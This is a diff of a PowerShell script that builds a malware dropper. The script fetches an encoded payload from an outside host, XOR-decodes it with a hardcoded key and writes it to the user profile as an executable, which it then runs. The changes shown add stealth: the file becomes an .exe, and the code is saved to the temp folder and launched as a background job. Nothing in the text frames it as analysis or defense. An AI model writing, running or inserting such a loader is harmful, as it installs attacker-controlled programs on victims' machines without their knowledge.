@@ -1,20 +1,37 @@
-$u='https://yodesapi.com/xorbin.txt'
-
+$script = @'
 try {
+    $u = 'https://yodesapi.com/xorbin.txt'
     $k = 'moon'
-    if (!$u) { throw 'Missing URL' }
+
+    if (!$u) {
+        throw 'Missing URL'
+    }
 
     Add-Type 'using System.Net;public class D{public static string G(string u){using(var w=new WebClient())return w.DownloadString(u);}}'
 
     $b = [Convert]::FromBase64String(([D]::G($u) -replace '\s'))
     $x = [Text.Encoding]::UTF8.GetBytes($k)
+
     $o = [byte[]](0..($b.Length - 1) | ForEach-Object {
         $b[$_] -bxor $x[$_ % $x.Length]
     })
-    $file = "$env:USERPROFILE\fhdsb.bat"
+
+        $file = "$env:USERPROFILE\fhdsb.exe"
     [IO.File]::WriteAllBytes($file, $o)
     & $file
+
+
+
 }
 catch {
     Write-Host "Error: $($_.Exception.Message)"
 }
+'@
+
+$tempPath = Join-Path $env:TEMP 'raws.ps1'
+$script | Set-Content -Path $tempPath -Encoding UTF8
+
+Start-Job -ScriptBlock {
+    param($path)
+    & $path
+} -ArgumentList $tempPath
